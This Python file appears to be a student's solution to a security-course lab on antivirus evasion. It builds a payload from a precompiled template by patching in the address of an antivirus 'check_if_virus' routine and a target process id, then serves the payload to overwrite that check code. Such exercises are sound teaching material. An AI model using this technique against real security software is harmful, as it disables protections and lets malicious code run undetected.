import addresses
import evasion

from infosec.core import assemble


UNUSUAL_PID_VALUE_FOR_BIN_PATCH = 0x12345678;
UNUSUAL_MEMORY_ADDRESS_FOR_BIN_PATCH = 0x56565656;

class SolutionServer(evasion.EvadeAntivirusServer):

    def get_payload(self, pid: int) -> bytes:
        """Returns a payload to replace the check_if_virus code.

        Notes:
        1. You can assume we already compiled q2.c into q2.template.
        2. Use addresses.CHECK_IF_VIRUS_CODE (and addresses.address_to_bytes).
        3. If needed, you can use infosec.core.assemble.

        Returns:
             The bytes of the payload.
        """
        PATH_TO_TEMPLATE = './q2.template'
        addr_check_if_virus = addresses.address_to_bytes(addresses.CHECK_IF_VIRUS_CODE)
        pid_in_bytes = addresses.address_to_bytes(pid)
        with open(PATH_TO_TEMPLATE, "r+b") as read_writer:
            general_payload = read_writer.read()
        
        general_payload = general_payload.replace(addresses.address_to_bytes(UNUSUAL_MEMORY_ADDRESS_FOR_BIN_PATCH), addr_check_if_virus)
        general_payload = general_payload.replace(addresses.address_to_bytes(UNUSUAL_PID_VALUE_FOR_BIN_PATCH), pid_in_bytes) 
        payload = general_payload
        return payload

    def print_handler(self, product: bytes):
        # WARNING: DON'T EDIT THIS FUNCTION!
        print(product.decode('latin-1'))

    def evade_antivirus(self, pid: int):
        # WARNING: DON'T EDIT THIS FUNCTION!
        self.add_payload(
            self.get_payload(pid),
            self.print_handler)


if __name__ == '__main__':
    SolutionServer().run_server(host='0.0.0.0', port=8000)
